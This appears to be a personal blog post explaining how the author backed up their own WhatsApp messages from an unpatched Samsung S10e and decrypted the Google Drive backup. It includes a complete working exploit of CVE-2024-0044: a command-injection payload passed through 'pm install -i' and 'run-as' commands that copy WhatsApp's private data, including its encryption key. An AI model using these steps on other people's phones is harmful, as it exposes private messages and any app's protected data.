+++
title = "WhatsApp backup: Samsung S10e key extraction, Google Drive download, HTML export"
date = 2026-08-22
description = "This document describes the workflow I used to back up my own WhatsApp data on a Samsung Galaxy S10e (SM-G970F), Android 12, security patch 2023-03-01."
draft = false
+++

This post describes the workflow I used to back up my own WhatsApp data on a Samsung Galaxy S10e (SM-G970F), Android 12, security patch 2023-03-01 before transferring to a new phone. I had two main goals:

1) Extract the database from my phone to keep a copy of my messages in case the built-in WhatsApp migration tool failed (which seems to [happen frequently](https://www.reddit.com/r/whatsapp/search/?q=backup+issue)) ;
2) Verify that the backup saved by WhatsApp in Google Drive indeed contains all my message and media files.

Ensuring these two points is a requirement for me to be able to migrate my data to my new phone with peace of mind (one should not trust Meta). The difficulty here is that there is no official way to achieve 1): you would need a rooted device to do so. As mine is not, we will need to exploit the [Zygote command injection CVE](https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html) to read WhatsApp's internal databases.

Here's my plan:

| Step | Tool | Purpose |
|------|------|---------|
| 1 | [CVE-2024-0044](https://tinyhack.com/2024/06/07/extracting-whatsapp-database-or-any-app-data-from-android-12-13-using-cve-2024-0044/) | Extract WhatsApp's `key` + live `msgstore.db` from the phone (no root) |
| 2 | [whatsapp-backup-downloader-decryptor](https://github.com/giacomoferretti/whatsapp-backup-downloader-decryptor) (`wabdd`) | Download the Google Drive backup |
| 3 | [Whatsapp-Chat-Exporter](https://github.com/KnugiHK/Whatsapp-Chat-Exporter) (`wtsexporter`) | Decrypt `msgstore.db.crypt14` with the extracted `key` and generate HTML |

This guide is for backing up **your own** data on **your own** device. The CVE could be used to access any app's internal data.

---

## The plan with my current S10e

My S10e has not been receiving security patches from Samsung since March 2023, which is [yet another sign that companies like Samsung have no regard for their customers](#) despite [astronomical profits](https://www.cnbc.com/2026/07/30/samsung-q2-earnings-ai-chip-.html). We're going to turn this to our advantage to extract the live WhatsApp database `msgstore.db` as well as the key `key` that will allow us to decrypt the backup stored in Google Drive `msgstore.db.crypt14`. The CVE exploit is read-only, there is no risk for data loss here.

### Verify the device's vulnerability to the CVE

I relied on [this tinyhack tutorial](https://tinyhack.com/2024/06/07/extracting-whatsapp-database-or-any-app-data-from-android-12-13-using-cve-2024-0044/) to conduct the exploit. For this to work, your phone must be running Android 12 or 13 with a security patch **≤ 2024-02-01**. Root access is not needed.

First, install [adb] on your computer, plug your phone, and make sure that USB Debugging is enabled. Test the device for the CVE vulnerability:

```text
$ adb devices -l
List of devices attached
RF8M611RMJZ            device usb:1-1 product:beyond0lteeea model:SM_G970F device:beyond0 transport_id=3

$ adb shell getprop ro.build.version.security_patch
2023-03-01

$ adb shell getprop ro.build.version.release
12
```

We need the uid for WhatsApp (the uid will likely differ on your device):

```
$ adb shell pm list packages -U | grep com.wha
package:com.whatsapp uid:10247
```

My uid for WhatsApp is `10247`.

### Download APK and create payload

On your computer, download an APK from the internet (any APK is fine):

```bash
curl -L -o F-Droid.apk "https://f-droid.org/F-Droid.apk"
ls -lh F-Droid.apk    # must be ~12 MB, not 12 KB
```

Prepare the payload in a `payload.txt` (make sure to replace my uid with yours). The newline after `@null` is required:

```
cat > payload.txt <<'EOF'
@null
victim 10247 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null
EOF
```

### Run the exploit

Push these 2 files to your device using `adb`:

```bash
adb push F-Droid.apk /data/local/tmp/
adb push payload.txt /data/local/tmp/
```

Run the exploit inside `adb shell`:

```bash
PAYLOAD="$(cat /data/local/tmp/payload.txt)"
pm install -i "$PAYLOAD" /data/local/tmp/F-Droid.apk
# Expected: Success
```

Now let's do some preparatory work on the device for the future databse copy. Still inside `adb shell`:

```bash
mkdir -p /data/local/tmp/wa
touch /data/local/tmp/wa/wa.tar
chmod -R 0777 /data/local/tmp/wa
```

Finally, extract the database:


```bash
run-as victim
# ls . may show "Permission denied" — normal
ls /data/data/com.whatsapp
tar -cf /data/local/tmp/wa/wa.tar com.whatsapp
exit
exit
```

Verify on device:

```sh
ls -l /data/local/tmp/wa/wa.tar
# ~270 MB
```

### Pull and extract on your computer

Back on your computer:

```bash
adb pull /data/local/tmp/wa/wa.tar
mkdir -p ~/wa_extract
tar -xf wa.tar -C ~/wa_extract

ls -la ~/wa_extract/com.whatsapp/files/key
ls -la ~/wa_extract/com.whatsapp/databases/msgstore.db
```

My results:

```text
-rw------- 1 thomas users      158 Nov  6  2019 ~/wa_extract/com.whatsapp/files/key
-rw------- 1 thomas users 84676608 Aug 22 13:28 ~/wa_extract/com.whatsapp/databases/msgstore.db
```

- **`msgstore.db`** — live WhatsApp database, already decrypted.
- **`key`** (158 bytes) — will be useful to decrypt `msgstore.db.crypt14` from Google Drive.
- **`wa.db`** — contact names (optional).

Keep these files private. At this point, you already have a copy of all your WhatsApp messages in `msgstore.db`. In contrary to the Google Drive backup, messages are not encrypted in this database.

Note that media files are stored outisde of WhatsApp internal data, so you should backup these files separately from `msgstore.db` using your Android file explorer.

### Optional — visualize what's in `msgstore.db`

You can use [Whatsapp-Chat-Exporter](https://github.com/KnugiHK/Whatsapp-Chat-Exporter) (`wtsexporter`) to generate HTML reports of your WhatsApp messages. We do not need to decrypt anything here since we exploited the CVE to extract the clear `msgstore.db`.

```bash
mkdir -p ~/wa-backup/working_live

cd ~/wa-backup/working_live
cp ~/wa_extract/com.whatsapp/databases/msgstore.db .
cp ~/wa_extract/com.whatsapp/databases/wa.db .

cp -r ~/wa-backup/backups/33601234567/Media ./WhatsApp

pip install whatsapp-chat-exporter
wtsexporter -a -w wa.db -m WhatsApp -o result_live
```

---

## Google Drive Backup — download and decrypt

My second goal was to make sure the Google Drive backup was complete. Now that we've extracted the 158 bytes key at `com.whatsapp/files/key` using the CVE, we'll be able to download and then decrypt that backup.

A quick note on the backup format: WhatsApp stores its cloud backup as `msgstore.db.crypt14`. The `.crypt14` suffix denotes the encryption scheme in use. In this security model, **WhatsApp owns the key** — it is generated silently by the app and stored on your device at `com.whatsapp/files/key`. This is what we extracted in the previous section. Had my backup been end-to-end encrypted (toggleable in `WhatsApp Settings → Chats → Chat Backup`), an additional user-defined password or 64-digit key would protect the file, and the `key` file alone would not be sufficient.

### Download your Google Drive backup

We'll leverage [`wabdd`](https://github.com/giacomoferretti/whatsapp-backup-downloader-decryptor) to authenticate with Google Drive using a token and pull the backup:

```bash
pip install wabdd

mkdir -p ~/wa-backup/tokens ~/wa-backup/backups
cd ~/wa-backup

# Interactive: paste oauth_token when prompted
wabdd token thomas@gmail.com

# Or save the token manually to tokens/thomas@gmail.com_token.txt
wabdd download --token-file tokens/thomas@gmail.com_token.txt
```

`wabdd` will open a browser window to authenticate your Google account, log in with the Google account used in `WhatsApp → Settings → Chats → Chat backup`. Here is the expected layout after download (paths may vary slightly):

```text
backups/33601234567/
├── Backups/
│   ├── backup_settings.json.crypt14
│   ├── chatsettingsbackup.db.crypt14
│   ├── wa.db.crypt14
│   └── ...
├── Databases/
│   └── msgstore.db.crypt14
├── Media/
│   ├── WhatsApp Images/
│   ├── WhatsApp Video/
│   ├── WhatsApp Audio/
│   ├── WhatsApp Documents/
│   ├── WhatsApp Voice Notes/
│   └── ...
└── metadata.json
```

You can recognized the encrypted version of the database named `msgstore.db.crypt14`. Notice that media files are not encrypted.

### Decrypt the backup and generate HTML reports

We'll use [Whatsapp-Chat-Exporter](https://github.com/KnugiHK/Whatsapp-Chat-Exporter) (`wtsexporter`) to achieve two things:

- Decrypt the `.crypt14` backup using the `key` we extracted earlier ;
- Generate HTML reports of our WhatsApp messages.

Install the tool with extra `android_backup`:

```bash
pip install whatsapp-chat-exporter[android_backup]
```

Let's prepare a working directory:

```bash
mkdir -p ~/wa-backup/working
cd ~/wa-backup/working

# Key from CVE exploit
cp ~/wa_extract/com.whatsapp/files/key .

# Encrypted chat DB from wabdd download
cp ~/wa-backup/backups/33601234567/Databases/msgstore.db.crypt14 .

# Contact DB (decrypt wa.db.crypt14 with same key, or copy from phone tar)
cp ~/wa_extract/com.whatsapp/databases/wa.db .

# Media from Drive download
cp -r ~/wa-backup/backups/33601234567/Media ./WhatsApp
```

Working directory should look like:

```text
working/
├── key
├── msgstore.db.crypt14
├── wa.db
└── WhatsApp/
    ├── WhatsApp Images/
    ├── WhatsApp Video/
    └── ...
```

We're finally ready to decrypt our messages:

```bash
cd ~/wa-backup/working
wtsexporter -a -k key -b msgstore.db.crypt14 -w wa.db -m WhatsApp -o results
```

Open `results/index.html` in a browser to check that all data has been retrieved. Whatsapp-Chat-Exporter has many useful options:

```bash
wtsexporter --help
```

---

## End-to-end flow (summary)

```
S10e (CVE-2024-0044)
  └─> key (158 B) + msgstore.db + wa.db

Google (oauth_token + wabdd download)
  └─> msgstore.db.crypt14 + Media/

Whatsapp-Chat-Exporter
  └─> wtsexporter -a -k key -b msgstore.db.crypt14 -w wa.db -m WhatsApp -o results
  └─> results/index.html
```

---

## After backup — moving to a new phone

Now that we know we can decrypt the database backed up on Drive, we can go ahead and migrate using the official WhatsApp procedure with peace of mind.

Once your data is migrated, I would advise to enable end-to-end encrypted backups in WhatsApp settings. This will override the `.crypt14` database backed up in Drive with a `.crypt15` backup. Rather than WhatsApp silently storing a key on the device, crypt15 derives the encryption key from either a user-chosen 64-digit key that WhatsApp generates and presents to you once (do **not** use a password but a 64-digit key that you should both print and store in your password manager). Theoritically WhatsApp cannot decrypt the backup — and critically, there is no `key` file sitting on the filesystem to extract. The attack vector we used in this post simply does not exist in this model. This is how things should have always been handled.

And please, use [Signal](https://signal.org/download/) instead of WhatsApp 😉
